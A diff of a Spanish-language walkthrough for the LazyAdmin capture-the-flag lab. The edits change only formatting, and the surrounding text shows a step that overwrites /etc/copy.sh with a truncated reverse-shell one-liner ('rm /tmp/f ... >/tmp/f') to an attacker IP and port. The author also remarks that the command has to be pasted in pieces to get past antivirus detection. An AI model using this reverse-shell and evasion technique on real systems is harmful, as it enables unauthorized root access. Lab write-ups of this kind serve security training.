@@ -78,8 +78,7 @@ archivos/subcarpetas) y una página de Login: "**Welcome to
 SweetRice!**"
 ![](media_lazyadmin/media/image15.png)
 
-![](media_lazyadmin/media/image16.png){width="5.905555555555556in"
-height="5.257638888888889in"}
+![](media_lazyadmin/media/image16.png)
 
 Se estuvo revisando en todos los directorios escaneados, y en la URL:
 [**http://10.67.167.106/content/inc/**](http://10.67.167.106/content/inc/),
@@ -221,9 +220,9 @@ Se válida que el usuario actual puede ejecutar la ruta "**/usr/bin/perl
 
 Se reemplaza el contenido del archivo "**/etc/copy.sh**", cambiando la
 **IP** del Kali y el puerto **5555**. Comando: **echo "rm /tmp/f
-.............. \>/tmp/f" \> /etc/copy.sh** [(no se puede escribir todo
+.............. \>/tmp/f" \> /etc/copy.sh** (no se puede escribir todo
 el comando debido a que los antivirus lo detectan, sin embargo se puede
-copiar y pegar por parte en el equipo objetivo).]{.mark}
+copiar y pegar por parte en el equipo objetivo).
 
 ![](media_lazyadmin/media/image45.png)
 
